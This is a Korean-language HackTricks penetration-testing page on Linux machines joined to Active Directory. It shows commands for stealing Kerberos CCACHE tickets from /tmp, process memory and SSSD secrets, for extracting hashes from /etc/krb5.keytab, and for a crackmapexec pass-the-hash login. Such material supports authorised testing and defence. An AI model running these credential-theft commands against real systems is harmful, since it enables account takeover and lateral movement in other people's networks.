# Linux Active Directory

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

리눅스 머신은 Active Directory 환경 내에 존재할 수 있습니다.

AD의 리눅스 머신은 **파일 내에 다양한 CCACHE 티켓을 저장하고 있을 수 있습니다. 이 티켓은 다른 kerberos 티켓처럼 사용되고 악용될 수 있습니다**. 이 티켓을 읽으려면 티켓의 사용자 소유자이거나 **root**여야 합니다.

## Enumeration

### 리눅스에서 AD 열거하기

리눅스(또는 Windows의 bash)에서 AD에 접근할 수 있다면 [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn)를 사용하여 AD를 열거할 수 있습니다.

리눅스에서 AD를 열거하는 **다른 방법**을 배우려면 다음 페이지를 확인하세요:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA는 Microsoft Windows **Active Directory**에 대한 오픈 소스 **대안**으로, 주로 **Unix** 환경을 위해 설계되었습니다. Active Directory와 유사한 관리 기능을 위해 MIT **Kerberos** 키 배포 센터와 완전한 **LDAP 디렉토리**를 결합합니다. CA 및 RA 인증서 관리를 위한 Dogtag **Certificate System**을 활용하며, 스마트카드를 포함한 **다중 인증**을 지원합니다. Unix 인증 프로세스를 위해 SSSD가 통합되어 있습니다. 자세한 내용은 다음에서 확인하세요:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## 티켓 다루기

### Pass The Ticket

이 페이지에서는 **리눅스 호스트 내에서 kerberos 티켓을 찾을 수 있는 다양한 장소**를 찾을 수 있으며, 다음 페이지에서는 이 CCache 티켓 형식을 Kirbi(Windows에서 사용해야 하는 형식)로 변환하는 방법과 PTT 공격을 수행하는 방법을 배울 수 있습니다:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### /tmp에서 CCACHE 티켓 재사용

CCACHE 파일은 **Kerberos 자격 증명**을 저장하기 위한 이진 형식으로, 일반적으로 `/tmp`에 600 권한으로 저장됩니다. 이 파일은 **이름 형식 `krb5cc_%{uid}`**로 식별할 수 있으며, 이는 사용자의 UID와 관련이 있습니다. 인증 티켓 검증을 위해 **환경 변수 `KRB5CCNAME`**을 원하는 티켓 파일의 경로로 설정하여 재사용할 수 있습니다.

`env | grep KRB5CCNAME`으로 인증에 사용되는 현재 티켓을 나열합니다. 형식은 이식 가능하며, `export KRB5CCNAME=/tmp/ticket.ccache`로 환경 변수를 설정하여 티켓을 **재사용할 수 있습니다**. Kerberos 티켓 이름 형식은 `krb5cc_%{uid}`이며, 여기서 uid는 사용자 UID입니다.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### CCACHE 티켓 재사용 from keyring

**프로세스의 메모리에 저장된 Kerberos 티켓은 추출될 수 있습니다**, 특히 머신의 ptrace 보호가 비활성화된 경우(`/proc/sys/kernel/yama/ptrace_scope`). 이 목적을 위한 유용한 도구는 [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)에서 찾을 수 있으며, 세션에 주입하고 `/tmp`에 티켓을 덤프하여 추출을 용이하게 합니다.

이 도구를 구성하고 사용하기 위해서는 아래 단계를 따릅니다:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
이 절차는 다양한 세션에 주입을 시도하며, 성공을 나타내기 위해 추출된 티켓을 `/tmp`에 `__krb_UID.ccache`라는 명명 규칙으로 저장합니다.


### SSSD KCM에서 CCACHE 티켓 재사용

SSSD는 `/var/lib/sss/secrets/secrets.ldb` 경로에 데이터베이스의 복사본을 유지합니다. 해당 키는 `/var/lib/sss/secrets/.secrets.mkey` 경로에 숨겨진 파일로 저장됩니다. 기본적으로, 키는 **root** 권한이 있는 경우에만 읽을 수 있습니다.

\*\*`SSSDKCMExtractor` \*\*를 --database 및 --key 매개변수와 함께 호출하면 데이터베이스를 구문 분석하고 **비밀을 복호화**합니다.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
The **자격 증명 캐시 Kerberos blob은 Mimikatz/Rubeus에 전달할 수 있는 사용 가능한 Kerberos CCache** 파일로 변환될 수 있습니다.

### keytab에서 CCACHE 티켓 재사용
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### /etc/krb5.keytab에서 계정 추출

루트 권한으로 운영되는 서비스에 필수적인 서비스 계정 키는 **`/etc/krb5.keytab`** 파일에 안전하게 저장됩니다. 이러한 키는 서비스의 비밀번호와 유사하며, 엄격한 기밀성을 요구합니다.

keytab 파일의 내용을 검사하기 위해 **`klist`**를 사용할 수 있습니다. 이 도구는 사용자 인증을 위한 **NT Hash**를 포함한 키 세부 정보를 표시하도록 설계되었습니다. 특히 키 유형이 23으로 식별될 때 그렇습니다.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Linux 사용자에게 **`KeyTabExtract`**는 NTLM 해시 재사용을 위해 활용할 수 있는 RC4 HMAC 해시를 추출하는 기능을 제공합니다.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOS에서 **`bifrost`**는 keytab 파일 분석을 위한 도구로 사용됩니다.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
추출된 계정 및 해시 정보를 활용하여 **`crackmapexec`**와 같은 도구를 사용하여 서버에 연결할 수 있습니다.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## References
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<figure><img src="/..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}
